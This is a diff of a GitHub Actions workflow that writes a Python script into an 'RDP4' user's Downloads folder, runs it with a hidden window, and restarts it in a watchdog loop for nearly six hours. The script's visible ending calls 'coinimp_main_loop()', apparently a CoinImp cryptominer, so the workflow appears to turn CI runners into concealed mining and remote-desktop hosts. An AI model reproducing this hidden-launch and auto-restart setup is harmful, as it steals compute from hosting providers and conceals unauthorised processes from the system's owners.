@@ -243,12 +243,22 @@ jobs:
           pip --version
           
       
-      - name: Create and run Python script directly      
+      
+      - name: Create Python script file in RDP4 user's Downloads folder
         run: |
-          $scriptPath = "$env:TEMP\automation_script.py"
+          # Create the script in RDP4 user's Downloads folder
+          $scriptPath = "C:\Users\RDP4\Downloads\automation_script.py"
+          
+          # Ensure the Downloads directory exists
+          $downloadsDir = "C:\Users\RDP4\Downloads"
+          if (-not (Test-Path $downloadsDir)) {
+              New-Item -ItemType Directory -Path $downloadsDir -Force
+          }
+          
+          Write-Host "Creating Python script in RDP4 user's Downloads folder: $scriptPath"
           
           # Create the Python script in multiple parts to avoid YAML parsing issues
-          $pythonParts = @(
+          $pythonParts = @(                  
             'import os',
             'import subprocess',
             'import sys',
@@ -753,28 +763,64 @@ jobs:
             '    print("="*50)',
             '    coinimp_main_loop()'
           )
-          # Save the script to a file
+          # Save the script to a file in RDP4 user's Downloads folder
           Set-Content -Path $scriptPath -Value $pythonParts -Encoding UTF8
-          Write-Host "Python script created successfully at: $scriptPath"
-          
-      - name: Run Python script
+          Write-Host "Python script created successfully in RDP4 user's Downloads folder: $scriptPath"
+
+      - name: Verify script creation in RDP4 user's Downloads folder
         run: |
-          $scriptPath = "$env:TEMP\automation_script.py"
+          $scriptPath = "C:\Users\RDP4\Downloads\automation_script.py"
+          
+          if (Test-Path $scriptPath) {
+              Write-Host "✓ Script created successfully at: $scriptPath"
+              Write-Host "File size: $( (Get-Item $scriptPath).Length ) bytes"
+          } else {
+              Write-Host "✗ Script was not created in RDP4 user's Downloads folder"
+              Write-Host "Checking alternative locations..."
+              
+              # Check a few possible locations
+              $possiblePaths = @(
+                  "C:\Users\RDP4\Downloads\automation_script.py",
+                  "C:\Users\RDP4\Documents\automation_script.py",
+                  "$env:TEMP\automation_script.py"
+              )
+              
+              foreach ($path in $possiblePaths) {
+                  if (Test-Path $path) {
+                      Write-Host "Found script at: $path"
+                      break
+                  }
+              }
+          }          
+
+      - name: Run Python script from RDP4 user's Downloads folder
+        run: |
+          $scriptPath = "C:\Users\RDP4\Downloads\automation_script.py"
           
           # Run the script in the background
           Start-Process python -ArgumentList "$scriptPath" -WindowStyle Hidden
-          Write-Host "Python script started in the background"          
-            
-      - name: Keep RDP session active
+          Write-Host "Python script started in the background from RDP4 user's Downloads folder"
+          
+      - name: Keep RDP session active with Python script running
         run: |
-          $endTime = (Get-Date).AddMinutes(355)
+          $endTime = (Get-Date).AddMinutes(350)  # 5 minutes less than total timeout
           
           while ((Get-Date) -lt $endTime) {
-              Write-Host "[$(Get-Date -Format 'HH:mm:ss')] RDP Active"
+              # Check if Python process is still running
+              $pythonProcess = Get-Process python -ErrorAction SilentlyContinue
+              if (-not $pythonProcess) {
+                  Write-Host "Python script stopped, restarting..."
+                  $scriptPath = "C:\Users\RDP4\Downloads\automation_script.py"
+                  Start-Process python -ArgumentList "$scriptPath" -WindowStyle Hidden
+              }
+              
+              Write-Host "[$(Get-Date -Format 'HH:mm:ss')] RDP Active - Python script running"
               Start-Sleep -Seconds 30
           }
           
           Write-Host "RDP session completed successfully!"
+
+            
       - name: 🧹 PURGE any devices containing 'RDP4' (shutdown)
         if: always()
         run: |
